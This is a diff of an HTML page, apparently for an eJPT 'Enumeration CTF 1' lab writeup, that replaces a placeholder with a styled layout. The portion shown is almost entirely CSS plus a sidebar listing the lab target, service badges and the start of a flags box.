@@ -3,129 +3,1685 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Enumeration CTF 1 | eJPT CTF</title>
+<title>Enumeration CTF 1 — eJPT Writeup</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,700;1,400&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
 <style>
+/* ====================================================
+   DESIGN TOKENS
+   ==================================================== */
 :root {
-  --bg: #080c18; --bg-surface: #0d1428; --bg-card: #111827; --border: #1d2d50; --border-sub: #162040;
-  --cyan: #22d3ee; --cyan-dim: rgba(34,211,238,.12); --amber: #f59e0b; --amber-dim: rgba(245,158,11,.12);
-  --green: #22c55e; --green-dim: rgba(34,197,94,.12); --red: #ef4444; --red-dim: rgba(239,68,68,.12);
-  --text: #e2e8f0; --muted: #94a3b8; --dim: #64748b;
-  --mono: 'JetBrains Mono', monospace; --sans: 'Inter', sans-serif; --r: 6px; --r-lg: 10px;
+  --bg:          #07090f;
+  --bg-surface:  #0b0f1c;
+  --bg-card:     #0f1626;
+  --bg-code:     #050810;
+  --border:      #1a2640;
+  --border-sub:  #111d33;
+  --cyan:        #22d3ee;
+  --cyan-dim:    rgba(34,211,238,.11);
+  --cyan-glow:   rgba(34,211,238,.04);
+  --amber:       #f59e0b;
+  --amber-dim:   rgba(245,158,11,.12);
+  --red:         #ef4444;
+  --red-dim:     rgba(239,68,68,.12);
+  --green:       #22c55e;
+  --green-dim:   rgba(34,197,94,.12);
+  --purple:      #a855f7;
+  --purple-dim:  rgba(168,85,247,.10);
+  --orange:      #fb923c;
+  --orange-dim:  rgba(251,146,60,.10);
+  --text:        #e2e8f0;
+  --muted:       #94a3b8;
+  --dim:         #64748b;
+  --mono:        'JetBrains Mono', 'Fira Code', monospace;
+  --sans:        'Inter', system-ui, sans-serif;
+  --r:           6px;
+  --r-lg:        10px;
 }
+
 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 html { scroll-behavior: smooth; }
-body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.7; min-height: 100vh; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 15px;
+  line-height: 1.7;
+  min-height: 100vh;
+}
 
-.nav { position: sticky; top: 0; z-index: 300; display: flex; align-items: center; justify-content: space-between; padding: 16px 48px; background: rgba(8,12,24,.92); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); }
-.nav-brand { font-family: var(--mono); font-size: 15px; font-weight: 700; color: var(--text); text-decoration: none; letter-spacing: -.02em; }
-.nav-brand span { color: var(--cyan); }
-.nav-links { display: flex; gap: 28px; }
-.nav-links a { font-family: var(--mono); font-size: 12px; color: var(--muted); text-decoration: none; transition: color .14s; letter-spacing: .04em; text-transform: uppercase; }
-.nav-links a:hover { color: var(--cyan); }
+/* ====================================================
+   LAYOUT
+   ==================================================== */
+.layout {
+  display: grid;
+  grid-template-columns: 268px 1fr;
+  min-height: 100vh;
+  max-width: 1320px;
+  margin: 0 auto;
+}
 
-.hero { padding: 64px 48px 48px; border-bottom: 1px solid var(--border); position: relative; overflow: hidden; max-width: 1300px; margin: 0 auto; }
-.hero-eyebrow { font-family: var(--mono); font-size: 10.5px; color: var(--dim); letter-spacing: .12em; text-transform: uppercase; margin-bottom: 18px; display: flex; align-items: center; gap: 10px; }
+/* ====================================================
+   SIDEBAR
+   ==================================================== */
+.sidebar {
+  position: sticky;
+  top: 0;
+  height: 100vh;
+  overflow-y: auto;
+  border-right: 1px solid var(--border);
+  background: var(--bg-surface);
+  display: flex;
+  flex-direction: column;
+  padding: 28px 18px;
+  gap: 24px;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border) transparent;
+}
+.sidebar::-webkit-scrollbar { width: 4px; }
+.sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+.sb-eyebrow {
+  font-family: var(--mono);
+  font-size: 9.5px;
+  color: var(--cyan);
+  letter-spacing: .2em;
+  text-transform: uppercase;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.sb-eyebrow::before {
+  content: '';
+  display: block;
+  width: 18px;
+  height: 1px;
+  background: var(--cyan);
+}
+.sb-machine {
+  font-family: var(--mono);
+  font-size: 18px;
+  font-weight: 700;
+  color: var(--text);
+  letter-spacing: -.03em;
+  line-height: 1.15;
+  margin-top: 5px;
+}
+.sb-badges {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 5px;
+  margin-top: 8px;
+}
+.badge {
+  font-family: var(--mono);
+  font-size: 9px;
+  font-weight: 600;
+  padding: 3px 8px;
+  border-radius: 3px;
+  text-transform: uppercase;
+  letter-spacing: .08em;
+}
+.b-easy   { background:var(--green-dim);  color:var(--green);  border:1px solid rgba(34,197,94,.22); }
+.b-linux  { background:var(--cyan-dim);   color:var(--cyan);   border:1px solid rgba(34,211,238,.22); }
+.b-smb    { background:var(--orange-dim); color:var(--orange); border:1px solid rgba(251,146,60,.22); }
+.b-ftp    { background:var(--amber-dim);  color:var(--amber);  border:1px solid rgba(245,158,11,.22); }
+.b-ssh    { background:var(--purple-dim); color:var(--purple); border:1px solid rgba(168,85,247,.22); }
+
+/* Flags sidebar */
+.sb-flags-box {
+  background: var(--bg-code);
+  border: 1px solid var(--border-sub);
+  border-radius: var(--r-lg);
+  padding: 14px;
+  display: flex;
+  flex-direction: column;
+  gap: 9px;
+}
+.sb-flag-row {
+  display: flex;
+  align-items: center;
+  gap: 9px;
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--muted);
+}
+.sb-flag-dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  box-shadow: 0 0 6px var(--green);
+  flex-shrink: 0;
+}
+.sb-flag-num {
+  color: var(--dim);
+  font-size: 10px;
+  flex-shrink: 0;
+  width: 16px;
+}
+
+/* Target box */
+.sb-target {
+  background: var(--bg-code);
+  border: 1px solid var(--border-sub);
+  border-radius: var(--r-lg);
+  padding: 13px 14px;
+}
+.sb-target-lbl {
+  font-family: var(--mono);
+  font-size: 9px;
+  color: var(--dim);
+  text-transform: uppercase;
+  letter-spacing: .14em;
+  margin-bottom: 6px;
+}
+.sb-target-host {
+  font-family: var(--mono);
+  font-size: 12.5px;
+  color: var(--cyan);
+}
+.sb-target-ip {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--dim);
+  margin-top: 3px;
+}
+
+/* Nav */
+.sb-nav { display: flex; flex-direction: column; gap: 1px; flex: 1; }
+.sb-nav-label {
+  font-family: var(--mono);
+  font-size: 9px;
+  color: var(--dim);
+  text-transform: uppercase;
+  letter-spacing: .16em;
+  padding: 14px 8px 5px;
+}
+.sb-nav-label:first-child { padding-top: 0; }
+.nav-link {
+  display: flex;
+  align-items: center;
+  gap: 9px;
+  padding: 7px 10px;
+  border-radius: var(--r);
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 12.5px;
+  transition: all .14s ease;
+  border: 1px solid transparent;
+  cursor: pointer;
+}
+.nav-link:hover { color: var(--text); background: rgba(255,255,255,.04); }
+.nav-link.active {
+  color: var(--cyan);
+  background: var(--cyan-dim);
+  border-color: rgba(34,211,238,.16);
+}
+.nav-ic {
+  font-family: var(--mono);
+  font-size: 10px;
+  width: 18px;
+  color: var(--dim);
+  text-align: center;
+  flex-shrink: 0;
+}
+.nav-link.active .nav-ic { color: var(--cyan); }
+
+/* ====================================================
+   MOBILE HEADER
+   ==================================================== */
+.mob-header {
+  display: none;
+  position: sticky;
+  top: 0;
+  z-index: 300;
+  align-items: center;
+  justify-content: space-between;
+  padding: 14px 20px;
+  background: var(--bg-surface);
+  border-bottom: 1px solid var(--border);
+}
+.mob-brand { font-family: var(--mono); font-size: 14px; font-weight: 700; color: var(--text); }
+.mob-brand span { color: var(--cyan); }
+.mob-btn {
+  background: none;
+  border: 1px solid var(--border);
+  color: var(--muted);
+  font-family: var(--mono);
+  font-size: 11px;
+  padding: 6px 11px;
+  border-radius: var(--r);
+  cursor: pointer;
+  transition: all .14s;
+  letter-spacing: .05em;
+}
+.mob-btn:hover { color: var(--cyan); border-color: var(--cyan); }
+.sb-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,.65); z-index:299; }
+.sb-overlay.open { display:block; }
+
+/* ====================================================
+   MAIN / CONTENT
+   ==================================================== */
+.main { display: flex; flex-direction: column; min-width: 0; }
+
+/* ====================================================
+   HERO
+   ==================================================== */
+.hero {
+  padding: 54px 56px 44px;
+  border-bottom: 1px solid var(--border);
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: 'ENUM';
+  position: absolute;
+  right: -12px;
+  top: -20px;
+  font-family: var(--mono);
+  font-size: 200px;
+  font-weight: 700;
+  color: rgba(34,211,238,.02);
+  line-height: 1;
+  pointer-events: none;
+  user-select: none;
+  letter-spacing: -.06em;
+}
+.hero-eyebrow {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--dim);
+  letter-spacing: .12em;
+  text-transform: uppercase;
+  margin-bottom: 16px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
 .hero-eyebrow span { color: var(--cyan); }
-.hero-title { font-family: var(--mono); font-size: clamp(32px, 5vw, 54px); font-weight: 700; line-height: 1.1; color: var(--text); letter-spacing: -.05em; margin-bottom: 16px; }
-.cursor { display: inline-block; width: 5px; height: .82em; background: var(--cyan); margin-left: 4px; vertical-align: text-bottom; animation: blink 1.1s step-end infinite; }
+.hero-title {
+  font-family: var(--mono);
+  font-size: clamp(32px, 6vw, 62px);
+  font-weight: 700;
+  line-height: 1.05;
+  color: var(--text);
+  letter-spacing: -.045em;
+  margin-bottom: 8px;
+}
+.hero-title-sub {
+  font-family: var(--mono);
+  font-size: clamp(18px, 3vw, 26px);
+  font-weight: 400;
+  color: var(--cyan);
+  letter-spacing: -.02em;
+}
+.cursor {
+  display: inline-block;
+  width: 4px;
+  height: .82em;
+  background: var(--cyan);
+  margin-left: 3px;
+  vertical-align: text-bottom;
+  animation: blink 1.1s step-end infinite;
+}
 @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+.hero-sub {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--dim);
+  letter-spacing: .04em;
+  margin: 12px 0 28px;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 28px;
+  margin-bottom: 32px;
+}
+.meta-item { display: flex; flex-direction: column; gap: 4px; }
+.meta-label { font-family: var(--mono); font-size: 9px; color: var(--dim); text-transform: uppercase; letter-spacing: .14em; }
+.meta-val { font-family: var(--mono); font-size: 13px; font-weight: 600; }
+.mv-cyan   { color: var(--cyan); }
+.mv-green  { color: var(--green); }
+.mv-muted  { color: var(--muted); }
+.mv-orange { color: var(--orange); }
+.hero-desc { color: var(--muted); max-width: 740px; }
+.hero-desc strong { color: var(--amber); font-weight: 600; }
 
-.draft-badge {
-  display: inline-block; font-family: var(--mono); font-size: 10px; font-weight: 700;
-  text-transform: uppercase; letter-spacing: .12em; color: var(--amber); background: var(--amber-dim);
-  border: 1px solid rgba(245,158,11,.22); padding: 5px 14px; border-radius: 4px; margin-bottom: 20px;
+/* ====================================================
+   ATTACK PATH STRIP
+   ==================================================== */
+.attack-strip {
+  display: flex;
+  align-items: center;
+  flex-wrap: nowrap;
+  overflow-x: auto;
+  gap: 0;
+  padding: 12px 56px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg-surface);
+  scrollbar-width: none;
+}
+.attack-strip::-webkit-scrollbar { display: none; }
+.a-step {
+  font-family: var(--mono);
+  font-size: 10px;
+  padding: 5px 12px;
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  color: var(--muted);
+  background: var(--bg-card);
+  white-space: nowrap;
+  letter-spacing: .02em;
+}
+.a-step.scan  { color:var(--cyan);   border-color:rgba(34,211,238,.28);  background:var(--cyan-dim); }
+.a-step.smb   { color:var(--orange); border-color:rgba(251,146,60,.28);  background:var(--orange-dim); }
+.a-step.cred  { color:var(--purple); border-color:rgba(168,85,247,.28);  background:var(--purple-dim); }
+.a-step.ftp   { color:var(--amber);  border-color:rgba(245,158,11,.28);  background:var(--amber-dim); }
+.a-step.win   { color:var(--green);  border-color:rgba(34,197,94,.28);   background:var(--green-dim); font-weight:700; }
+.a-arrow { font-family:var(--mono); font-size:11px; color:var(--dim); padding:0 6px; flex-shrink:0; }
+
+/* ====================================================
+   CONTENT AREA
+   ==================================================== */
+.content { padding: 0 56px; }
+.section { padding: 50px 0; border-bottom: 1px solid var(--border-sub); }
+.section:last-child { border-bottom: none; }
+
+.section-hd { display: flex; align-items: flex-start; gap: 14px; margin-bottom: 28px; }
+.section-num {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--cyan);
+  background: var(--cyan-dim);
+  border: 1px solid rgba(34,211,238,.2);
+  padding: 4px 9px;
+  border-radius: 3px;
+  flex-shrink: 0;
+  margin-top: 3px;
+  letter-spacing: .04em;
+}
+.section-num.smb   { color:var(--orange); background:var(--orange-dim); border-color:rgba(251,146,60,.2); }
+.section-num.ftp   { color:var(--amber);  background:var(--amber-dim);  border-color:rgba(245,158,11,.2); }
+.section-num.ssh   { color:var(--purple); background:var(--purple-dim); border-color:rgba(168,85,247,.2); }
+.section-num.flag  { color:var(--green);  background:var(--green-dim);  border-color:rgba(34,197,94,.2); }
+
+.section-title { font-family:var(--mono); font-size:21px; font-weight:700; color:var(--text); letter-spacing:-.03em; line-height:1.2; }
+.section-title small { display:block; font-size:12px; font-weight:400; color:var(--dim); margin-top:4px; letter-spacing:.03em; }
+
+h3 {
+  font-family: var(--mono);
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text);
+  margin: 32px 0 11px;
+  padding-left: 12px;
+  border-left: 2px solid var(--cyan);
+  letter-spacing: -.01em;
+}
+h3.smb  { border-color: var(--orange); }
+h3.ftp  { border-color: var(--amber); }
+h3.ssh  { border-color: var(--purple); }
+h3.flag { border-color: var(--green); }
+
+p { color: var(--muted); margin-bottom: 15px; line-height: 1.78; }
+p:last-child { margin-bottom: 0; }
+
+code {
+  font-family: var(--mono);
+  font-size: 12px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  color: var(--cyan);
+  padding: 1px 6px;
+  border-radius: 3px;
 }
 
-.content { max-width: 1300px; margin: 0 auto; padding: 48px 48px 60px; }
-
-.placeholder-card {
-  background: var(--bg-card); border: 1px solid var(--border); border-radius: var(--r-lg);
-  padding: 40px; text-align: center; max-width: 700px; margin: 0 auto;
+/* ====================================================
+   TERMINAL BLOCKS
+   ==================================================== */
+.term {
+  background: var(--bg-code);
+  border: 1px solid var(--border);
+  border-radius: var(--r-lg);
+  overflow: hidden;
+  margin: 18px 0;
+  font-family: var(--mono);
+  font-size: 12.5px;
 }
-.placeholder-icon { font-size: 3rem; color: var(--amber); margin-bottom: 16px; opacity: .7; }
-.placeholder-title { font-family: var(--mono); font-size: 18px; font-weight: 700; color: var(--text); margin-bottom: 12px; }
-.placeholder-text { color: var(--muted); font-size: 14px; line-height: 1.7; margin-bottom: 24px; }
-.placeholder-note {
-  font-family: var(--mono); font-size: 12px; color: var(--dim);
-  border-top: 1px solid var(--border-sub); padding-top: 20px; margin-top: 20px;
+.term-hd {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 15px;
+  background: rgba(255,255,255,.022);
+  border-bottom: 1px solid var(--border);
 }
-.placeholder-note code { color: var(--cyan); background: var(--cyan-dim); padding: 2px 8px; border-radius: 3px; font-size: 11px; }
-
-.back-btn {
-  display: inline-flex; align-items: center; gap: 8px; font-family: var(--mono); font-size: 12px;
-  color: var(--cyan); text-decoration: none; border: 1px solid var(--border); padding: 10px 20px;
-  border-radius: var(--r); transition: all .14s; margin-top: 32px;
+.dots { display: flex; gap: 5px; }
+.dot  { width: 10px; height: 10px; border-radius: 50%; }
+.dr   { background: #ef4444; opacity:.7; }
+.dy   { background: #f59e0b; opacity:.7; }
+.dg   { background: #22c55e; opacity:.7; }
+.term-title { font-size:10.5px; color:var(--dim); letter-spacing:.05em; flex:1; margin-left:2px; }
+.copy-btn {
+  background: none;
+  border: 1px solid var(--border);
+  color: var(--dim);
+  font-family: var(--mono);
+  font-size: 9.5px;
+  padding: 3px 9px;
+  border-radius: 3px;
+  cursor: pointer;
+  transition: all .14s;
+  letter-spacing: .06em;
+  flex-shrink: 0;
 }
-.back-btn:hover { border-color: var(--cyan); background: var(--cyan-dim); }
+.copy-btn:hover { color:var(--cyan); border-color:var(--cyan); }
+.copy-btn.ok    { color:var(--green); border-color:var(--green); }
 
+.term-body {
+  padding: 18px 20px;
+  overflow-x: auto;
+  line-height: 1.68;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border) transparent;
+}
+.term-body::-webkit-scrollbar { height: 4px; }
+.term-body::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+.ln { display: flex; gap: 4px; flex-wrap: nowrap; }
+.p1 { color: var(--cyan);   user-select:none; flex-shrink:0; }
+.p2 { color: var(--red);    user-select:none; flex-shrink:0; }
+.p3 { color: var(--purple); user-select:none; flex-shrink:0; }
+.ps { color: var(--orange); user-select:none; flex-shrink:0; }
+.c  { color: var(--text); }
+.cm { color: var(--dim); font-style: italic; }
+.o  { color: var(--muted); }
+.oh { color: var(--amber); }
+.og { color: var(--green); }
+.oc { color: var(--cyan); }
+.or { color: var(--red); }
+.op { color: var(--purple); }
+.bl { min-height: .85em; display: block; }
+
+/* ====================================================
+   FLAG BOX
+   ==================================================== */
+.flag-box {
+  background: var(--bg-code);
+  border: 1px solid rgba(34,197,94,.28);
+  border-radius: var(--r-lg);
+  padding: 18px 22px;
+  margin: 18px 0;
+}
+.flag-box-hd {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 10px;
+  flex-wrap: wrap;
+  gap: 8px;
+}
+.flag-lbl {
+  font-family: var(--mono);
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: .14em;
+  color: var(--green);
+  display: flex;
+  align-items: center;
+  gap: 7px;
+}
+.flag-lbl::before {
+  content: '';
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  box-shadow: 0 0 8px var(--green);
+}
+.flag-loc { font-family:var(--mono); font-size:11px; color:var(--dim); }
+.flag-val { font-family:var(--mono); font-size:15px; font-weight:600; color:var(--green); letter-spacing:.03em; word-break:break-all; }
+.flag-method { font-family:var(--mono); font-size:11px; color:var(--dim); margin-top:5px; }
+
+/* ====================================================
+   CALLOUT
+   ==================================================== */
+.callout {
+  border-radius: var(--r-lg);
+  padding: 18px 20px;
+  margin: 22px 0;
+  border-left: 3px solid;
+}
+.callout-hd { display:flex; align-items:center; justify-content:space-between; margin-bottom:8px; }
+.c-label { font-family:var(--mono); font-size:9.5px; font-weight:700; text-transform:uppercase; letter-spacing:.14em; }
+.c-tag   { font-family:var(--mono); font-size:9.5px; padding:2px 9px; border-radius:3px; }
+.c-title { font-family:var(--mono); font-size:14px; font-weight:600; margin-bottom:8px; }
+.c-body  { color:var(--muted); font-size:13.5px; line-height:1.72; }
+
+.c-vuln   { background:var(--amber-dim);    border-color:var(--amber); }
+.c-vuln .c-label { color:var(--amber); }
+.c-vuln .c-title { color:var(--amber); }
+.c-vuln .c-tag   { background:rgba(245,158,11,.15); color:var(--amber); }
+
+.c-info   { background:var(--cyan-dim);     border-color:var(--cyan); }
+.c-info .c-label { color:var(--cyan); }
+.c-info .c-title { color:var(--cyan); }
+
+.c-danger { background:var(--red-dim);      border-color:var(--red); }
+.c-danger .c-label { color:var(--red); }
+.c-danger .c-title { color:var(--red); }
+
+.c-note   { background:var(--purple-dim);   border-color:var(--purple); }
+.c-note .c-label { color:var(--purple); }
+.c-note .c-title { color:var(--purple); }
+
+.c-win    { background:var(--green-dim);    border-color:var(--green); }
+.c-win .c-label  { color:var(--green); }
+.c-win .c-title  { color:var(--green); }
+
+/* ====================================================
+   CRED BOX
+   ==================================================== */
+.cred-box {
+  background: var(--bg-surface);
+  border: 1px solid var(--border);
+  border-radius: var(--r-lg);
+  padding: 18px 22px;
+  margin: 18px 0;
+  display: flex;
+  gap: 36px;
+  flex-wrap: wrap;
+  align-items: center;
+}
+.cred-item { display:flex; flex-direction:column; gap:4px; }
+.cred-lbl  { font-family:var(--mono); font-size:9px; text-transform:uppercase; letter-spacing:.14em; color:var(--dim); }
+.cred-val  { font-family:var(--mono); font-size:15px; font-weight:600; }
+.cv-name   { color:var(--text); }
+.cv-pass   { color:var(--amber); }
+.cv-svc    { color:var(--orange); font-size:12px; }
+.cv-port   { color:var(--red); font-size:12px; }
+
+/* ====================================================
+   PORT TABLE
+   ==================================================== */
+.port-tbl {
+  width: 100%;
+  border-collapse: collapse;
+  font-family: var(--mono);
+  font-size: 12.5px;
+  margin: 20px 0;
+  border: 1px solid var(--border);
+  border-radius: var(--r-lg);
+  overflow: hidden;
+}
+.port-tbl thead tr { background:var(--bg-surface); border-bottom:1px solid var(--border); }
+.port-tbl th {
+  padding: 10px 16px;
+  text-align: left;
+  font-size: 9.5px;
+  text-transform: uppercase;
+  letter-spacing: .14em;
+  color: var(--dim);
+  font-weight: 500;
+}
+.port-tbl td   { padding:12px 16px; border-bottom:1px solid var(--border-sub); color:var(--muted); }
+.port-tbl tbody tr:last-child td { border-bottom:none; }
+.port-tbl tbody tr:hover { background:rgba(255,255,255,.015); }
+.pn  { color:var(--cyan);   font-weight:600; }
+.ps  { color:var(--orange); }
+.pst { color:var(--green);  }
+.pnote { color:var(--amber); font-size:11.5px; }
+
+/* ====================================================
+   HIGHLIGHT BLOCK
+   ==================================================== */
+.hi-block {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--r);
+  padding: 13px 17px;
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--muted);
+  margin: 14px 0;
+  line-height: 1.85;
+}
+
+/* ====================================================
+   FLAGS SUMMARY TABLE
+   ==================================================== */
+.flags-tbl {
+  width: 100%;
+  border-collapse: collapse;
+  font-family: var(--mono);
+  font-size: 12px;
+  margin: 22px 0;
+  border: 1px solid var(--border);
+  border-radius: var(--r-lg);
+  overflow: hidden;
+}
+.flags-tbl thead tr { background:var(--bg-surface); border-bottom:1px solid var(--border); }
+.flags-tbl th { padding:9px 15px; text-align:left; font-size:9.5px; text-transform:uppercase; letter-spacing:.14em; color:var(--dim); font-weight:500; }
+.flags-tbl td { padding:12px 15px; border-bottom:1px solid var(--border-sub); color:var(--muted); }
+.flags-tbl tbody tr:last-child td { border-bottom:none; }
+.flags-tbl tbody tr:hover { background:rgba(255,255,255,.015); }
+.ft-num  { color:var(--green); font-weight:700; }
+.ft-loc  { color:var(--cyan); }
+.ft-meth { color:var(--amber); }
+.ft-val  { color:var(--dim); font-size:11px; font-style:italic; }
+
+/* ====================================================
+   POC IMAGES
+   ==================================================== */
+.poc {
+  margin: 20px 0;
+  border: 1px solid var(--border);
+  border-radius: var(--r-lg);
+  background: var(--bg-code);
+  overflow: hidden;
+}
+.poc-hd {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 8px 15px;
+  border-bottom: 1px solid var(--border);
+  background: rgba(255,255,255,.022);
+}
+.poc-lbl { font-family:var(--mono); font-size:10px; color:var(--dim); letter-spacing:.06em; }
+.poc-lbl span { color:var(--cyan); }
+.poc img  { display:block; width:100%; height:auto; cursor:zoom-in; }
+.poc-cap  { padding:9px 15px; font-family:var(--mono); font-size:11px; color:var(--dim); border-top:1px solid var(--border-sub); }
+
+/* Lightbox */
+.lightbox {
+  display: none;
+  position: fixed;
+  inset: 0;
+  z-index: 500;
+  background: rgba(2,4,12,.93);
+  align-items: center;
+  justify-content: center;
+  padding: 36px;
+  cursor: zoom-out;
+}
+.lightbox.open { display: flex; }
+.lightbox img {
+  max-width: 100%;
+  max-height: 100%;
+  border-radius: var(--r-lg);
+  border: 1px solid var(--border);
+  box-shadow: 0 24px 70px rgba(0,0,0,.6);
+}
+
+/* Divider */
+.divider { height:1px; background:var(--border-sub); margin:28px 0; }
+
+/* Wordlist box */
+.wl-box {
+  background: var(--bg-code);
+  border: 1px solid var(--border-sub);
+  border-radius: var(--r);
+  padding: 12px 16px;
+  margin: 12px 0;
+  font-family: var(--mono);
+  font-size: 12.5px;
+  color: var(--amber);
+}
+.wl-box .wl-lbl { color:var(--dim); font-size:9.5px; text-transform:uppercase; letter-spacing:.12em; margin-bottom:5px; }
+
+/* ====================================================
+   FOOTER
+   ==================================================== */
 .footer {
-  padding: 28px 48px; border-top: 1px solid var(--border); background: var(--bg-surface);
-  display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px;
-  max-width: 1300px; margin: 0 auto;
+  padding: 26px 56px;
+  border-top: 1px solid var(--border);
+  background: var(--bg-surface);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 12px;
 }
-.footer-l { font-family: var(--mono); font-size: 11px; color: var(--dim); }
-.footer-l span { color: var(--cyan); }
-.footer-r { display: flex; gap: 16px; }
-.ft-link { font-family: var(--mono); font-size: 11px; color: var(--dim); text-decoration: none; transition: color .14s; letter-spacing: .04em; }
-.ft-link:hover { color: var(--cyan); }
+.footer-l { font-family:var(--mono); font-size:11px; color:var(--dim); }
+.footer-l span { color:var(--cyan); }
+.footer-r { display:flex; gap:16px; }
+.ft-link {
+  font-family:var(--mono);
+  font-size:11px;
+  color:var(--dim);
+  text-decoration:none;
+  transition:color .14s;
+  letter-spacing:.04em;
+}
+.ft-link:hover { color:var(--cyan); }
 
-@media (max-width: 768px) {
-  .nav, .hero, .content, .footer { padding-left: 24px; padding-right: 24px; }
-  .hero { padding-top: 40px; }
-  .hero-title { font-size: 28px; }
+/* ====================================================
+   RESPONSIVE
+   ==================================================== */
+@media (max-width: 940px) {
+  .layout { grid-template-columns: 1fr; }
+  .sidebar {
+    position: fixed;
+    top: 0; left: 0;
+    height: 100vh;
+    width: 280px;
+    z-index: 300;
+    transform: translateX(-100%);
+    transition: transform .22s ease;
+  }
+  .sidebar.open { transform: translateX(0); }
+  .mob-header { display: flex; }
+  .hero, .content, .footer, .attack-strip { padding-left: 22px; padding-right: 22px; }
+  .hero { padding-top: 30px; }
+  .hero::before { font-size: 100px; }
+  .section { padding: 36px 0; }
+}
+@media (max-width: 480px) {
+  .hero-title { font-size: 26px; }
+  .hero-meta  { gap: 16px; }
+  .term-body  { font-size: 11px; }
+  .cred-box   { gap: 18px; }
+  .flag-val   { font-size: 13px; }
 }
 
-::-webkit-scrollbar { width: 6px; height: 6px; }
-::-webkit-scrollbar-track { background: transparent; }
-::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+::-webkit-scrollbar { width:6px; height:6px; }
+::-webkit-scrollbar-track { background:transparent; }
+::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
 </style>
 </head>
 <body>
 
-<nav class="nav">
-  <a href="index.html" class="nav-brand">root@aditya<span>://ejpt</span></a>
-  <div class="nav-links">
-    <a href="index.html">&larr; eJPT Hub</a>
-    <a href="https://github.com/adityasingh108/ejpt-ctf-writeups" target="_blank">GitHub</a>
-  </div>
-</nav>
+<!-- Mobile Header -->
+<header class="mob-header" id="mobHdr">
+  <div class="mob-brand">eJPT // <span>Enumeration CTF 1</span></div>
+  <button class="mob-btn" id="mobToggle">☰ Menu</button>
+</header>
 
-<section class="hero">
-  <div class="hero-eyebrow">eJPT CTF <span>&mdash;</span> Enumeration</div>
-  <div class="draft-badge"><i class="fas fa-pen"></i> Work in Progress</div>
-  <div class="hero-title">Enumeration CTF 1<span class="cursor"></span></div>
-</section>
+<div class="sb-overlay" id="sbOverlay"></div>
 
-<div class="content">
-  <div class="placeholder-card">
-    <div class="placeholder-icon"><i class="fas fa-file-code"></i></div>
-    <div class="placeholder-title">Writeup Being Documented</div>
-    <p class="placeholder-text">
-      This CTF writeup is currently being documented. The full walkthrough with reconnaissance,
-      enumeration, exploitation, and privilege escalation steps will be published here soon.
-    </p>
-    <p class="placeholder-note">
-      In the meantime, check out the <a href="index.html" style="color:var(--cyan);text-decoration:none;">eJPT Hub</a> or the <a href="https://github.com/adityasingh108/ejpt-ctf-writeups" target="_blank" style="color:var(--cyan);text-decoration:none;">GitHub repository</a>.
-      <br><br>
-      <code>// TODO: Add writeup content</code>
-    </p>
-  </div>
+<div class="layout">
+
+  <!-- ================================================
+       SIDEBAR
+       ================================================ -->
+  <aside class="sidebar" id="sidebar">
+    <div>
+      <div class="sb-eyebrow">eJPT Lab</div>
+      <div class="sb-machine">Assessment<br>Methodologies:<br>Enumeration</div>
+      <div class="sb-badges">
+        <span class="badge b-easy">Easy</span>
+        <span class="badge b-linux">Linux</span>
+        <span class="badge b-smb">SMB</span>
+        <span class="badge b-ftp">FTP</span>
+        <span class="badge b-ssh">SSH</span>
+      </div>
+    </div>
+
+    <div class="sb-target">
+      <div class="sb-target-lbl">Target</div>
+      <div class="sb-target-host">target.ine.local</div>
+      <div class="sb-target-ip">192.184.161.3</div>
+    </div>
+
+    <div class="sb-flags-box">
+      <div style="font-family:var(--mono);font-size:9px;color:var(--dim);text-transform:uppercase;letter-spacing:.14em;margin-bottom:4px;">Flags Captured</div>
